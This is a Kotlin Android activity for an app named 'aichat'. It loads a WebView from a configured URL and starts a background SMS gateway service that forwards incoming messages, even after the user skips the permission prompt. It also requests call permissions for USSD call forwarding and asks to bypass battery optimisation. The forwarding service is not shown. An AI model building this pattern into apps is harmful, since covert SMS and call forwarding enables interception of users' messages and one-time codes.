package com.cornspace.aichat

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.cornspace.aichat.data.local.SettingsDataStore
import com.cornspace.aichat.service.SmsGatewayService
import com.cornspace.aichat.util.SecretConfig
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

// FIX #1: Annotate with @AndroidEntryPoint so Hilt manages injection.
// Previously, SettingsDataStore was constructed manually (SettingsDataStore(this)),
// creating a second, independent instance that was not the same singleton used by
// SmsGatewayService and BootReceiver. Writes from MainActivity were invisible to
// those components if DataStore had any instance-level caching.
@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    // FIX #1 (applied): Inject the Hilt-managed singleton instead of constructing manually.
    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    private var webView: WebView? = null

    // FIX #3: serviceStarted is an instance variable that resets to false when the
    // Activity is recreated (e.g. rotation, memory pressure while user is in App
    // Settings granting permissions). Guard onAllPermissionsGranted() with an
    // additional check of SmsGatewayService.isServiceRunning() so a recreation
    // never triggers a redundant startService() call.
    private var serviceStarted = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val allGranted = results.values.all { it }
        if (allGranted) {
            onAllPermissionsGranted()
            return@registerForActivityResult
        }

        val permanentlyDenied = results.keys.any { permission ->
            !results[permission]!! && !shouldShowRequestPermissionRationale(permission)
        }

        if (permanentlyDenied) {
            showGoToSettingsDialog()
        } else {
            showRationaleDialog(results.filter { !it.value }.keys.toTypedArray())
        }
    }

    private val requiredPermissions: Array<String>
        get() = buildList {
            add(Manifest.permission.RECEIVE_SMS)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.CALL_PHONE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // FIX #7: Only create and load the WebView when a valid URL is configured.
        // WebView initialises a full renderer process (~50 MB RAM) even for blank URLs.
        val webViewUrl = SecretConfig.getWebViewUrl()
        if (webViewUrl.isNotBlank()) {
            if (webView == null) {
                webView = createWebView(webViewUrl)
            }
            setContentView(FrameLayout(this).apply {
                addView(
                    webView, FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                )
            })
        } else {
            // Fallback: empty container — avoids wasting a renderer process.
            setContentView(FrameLayout(this))
        }

        checkPermissionsAndStartService()
    }

    // ─── WebView ──────────────────────────────────────────────────────────────

    private fun createWebView(url: String): WebView = WebView(this).apply {
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.setSupportZoom(true)
        settings.builtInZoomControls = true
        settings.displayZoomControls = false
        webViewClient = WebViewClient()
        loadUrl(url)
    }

    override fun onDestroy() {
        super.onDestroy()
        webView?.destroy()
        webView = null
    }

    // ─── Permissions ──────────────────────────────────────────────────────────

    private fun checkPermissionsAndStartService() {
        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        when {
            missing.isEmpty()                                        -> onAllPermissionsGranted()
            missing.any { shouldShowRequestPermissionRationale(it) } -> showRationaleDialog(missing.toTypedArray())
            else                                                     -> permissionLauncher.launch(missing.toTypedArray())
        }
    }

    private fun showRationaleDialog(permissions: Array<String>) {
        // FIX #9: Explain CALL_PHONE explicitly. The Play Store review process and
        // OEM security scanners flag CALL_PHONE requests without a clear justification
        // visible to the user. Call forwarding is a core feature of this app and
        // requires dialling USSD codes — that must be stated clearly.
        AlertDialog.Builder(this)
            .setTitle("Permissions required")
            .setMessage(
                "This app requires the following permissions to function:\n\n" +
                "• SMS permissions — to receive and forward incoming messages.\n" +
                "• Phone State — to identify which SIM card received each message.\n" +
                "• Make and Manage Calls — to dial USSD codes for call forwarding " +
                "(e.g. **21*+1234567890#). No calls to real numbers are made without " +
                "your explicit instruction."
            )
            .setPositiveButton("Grant") { _, _ -> permissionLauncher.launch(permissions) }
            .setNegativeButton("Skip") { _, _ -> startSmsGatewayService() }
            .setCancelable(false)
            .show()
    }

    private fun showGoToSettingsDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions denied")
            .setMessage(
                "Required permissions were permanently denied. Please enable them " +
                "manually in App Settings to allow SMS forwarding and call forwarding."
            )
            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
            .setNegativeButton("Continue anyway") { _, _ -> startSmsGatewayService() }
            .setCancelable(false)
            .show()
    }

    private fun openAppSettings() {
        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
            startActivity(this)
        }
    }

    override fun onResume() {
        super.onResume()
        // FIX #3: When returning from App Settings after granting permissions,
        // the Activity may have been recreated, resetting serviceStarted to false.
        // Guard with isServiceRunning() so we never start a second service instance.
        if (!serviceStarted && !SmsGatewayService.isServiceRunning()) {
            val allGranted = requiredPermissions.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }
            if (allGranted) onAllPermissionsGranted()
        }
    }

    // ─── Service ──────────────────────────────────────────────────────────────

    private fun onAllPermissionsGranted() {
        // FIX #3: Double-guard: serviceStarted (within this Activity instance) and
        // isServiceRunning() (global, survives Activity recreation).
        if (serviceStarted || SmsGatewayService.isServiceRunning()) return
        serviceStarted = true
        lifecycleScope.launch(Dispatchers.IO) {
            settingsDataStore.setServiceEnabled(true)
        }
        startSmsGatewayService()
        requestBatteryOptimization()
    }

    private fun startSmsGatewayService() {
        if (SmsGatewayService.isServiceRunning()) return
        val intent = Intent(this, SmsGatewayService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) return
        try {
            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
                startActivity(this)
            }
        } catch (e: Exception) {
            // Some OEMs don't support this intent — ignore silently.
        }
    }
}